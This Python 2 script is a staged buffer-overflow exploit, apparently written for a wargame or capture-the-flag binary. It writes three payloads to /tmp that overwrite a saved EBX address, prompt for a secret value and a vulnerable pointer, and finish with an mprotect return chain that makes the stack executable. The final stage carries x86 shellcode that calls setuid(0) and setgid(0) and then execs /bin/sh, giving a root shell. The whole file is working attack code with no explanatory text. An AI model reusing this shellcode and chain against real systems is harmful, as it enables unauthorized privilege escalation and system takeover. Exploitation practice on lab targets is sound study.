# coding: utf-8
import struct

def p32(x):
    return struct.pack('<L', x)

# ============= STAGE 0 =================
buf_size = 8
ebx_addr = 0x80002ff8

payload0 = "\x41" * buf_size
payload0 += p32(ebx_addr)

stage0 = open("/tmp/stage0", "wb")
stage0.write(payload0)
stage0.close()

print "Use /tmp/stage0"

# ============= STAGE 1 ==================

buf_size = 8
protect = int(raw_input("Input secret value (EAX): "), 16)
ebx_addr = 0x80002ff4

payload1 = p32(protect)
payload1 += "\x41" * (buf_size - 4)
payload1 += p32(ebx_addr)

stage1 = open("/tmp/stage1", "wb")
stage1.write(payload1)
stage1.close()

print "Use /tmp/stage1"

# ============= STAGE 2 ==================

# setuid(0) + setgid(0) + execve("/bin/sh", ["/bin/sh", NULL]) â€“ 37 bytes
shellcode = "\x6a\x17\x58\x31\xdb\xcd\x80\x6a\x2e\x58\x53\xcd\x80\x31\xd2\x6a\x0b\x58\x52\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x52\x53\x89\xe1\xcd\x80"
nopsled = "\x90" * 10

buf_size = 76
mprotect = 0xb7efcd50
pop3ret = 0xb7e317d9
stack_addr = 0xbfedf000
stack_size = 0x121000
permissions = 0x7
vulnerable_pointer = int(raw_input("Input vuln pointer: "), 16)

payload2 = nopsled
payload2 += shellcode
payload2 += "\x41" * (buf_size - len(shellcode) - len(nopsled))
payload2 += p32(mprotect)
payload2 += p32(pop3ret)
payload2 += p32(stack_addr)
payload2 += p32(stack_size)
payload2 += p32(permissions)
payload2 += p32(vulnerable_pointer)

stage2 = open("/tmp/stage2", "wb")
stage2.write(payload2)
stage2.close()

print "Use /tmp/stage2"
